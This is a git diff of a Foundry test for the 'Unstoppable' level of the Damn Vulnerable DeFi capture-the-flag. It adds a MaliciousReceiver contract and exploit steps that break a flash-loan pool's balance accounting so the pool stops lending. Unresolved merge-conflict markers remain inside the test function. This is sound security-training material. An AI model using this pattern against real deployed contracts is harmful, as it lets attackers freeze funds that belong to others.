@@ -7,6 +7,27 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+import {SafeERC20} from "openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";
+
+contract MaliciousReceiver {
+    using SafeERC20 for IERC20;
+    UnstoppableLender private immutable pool;
+    address private immutable owner;
+
+    constructor(address poolAddress) {
+        pool = UnstoppableLender(poolAddress);
+        owner = msg.sender;
+    }
+
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        IERC20(tokenAddress).safeTransfer(msg.sender, amount+1);
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        pool.flashLoan(amount);
+    }
+}
 
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -56,6 +77,17 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+<<<<<<< HEAD:test/Levels/unstoppable/Unstoppable.t.sol
+=======
+        vm.startPrank(attacker);
+        MaliciousReceiver receiver = new MaliciousReceiver(
+            address(unstoppableLender)
+        );
+        vm.label(address(receiver), "Malicious Receiver");
+        dvt.transfer(address(receiver), 100);
+        receiver.executeFlashLoan(50);
+        vm.stopPrank();
+>>>>>>> 3d6ecc3 (stop the unstoppable):src/test/Levels/unstoppable/Unstoppable.t.sol
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
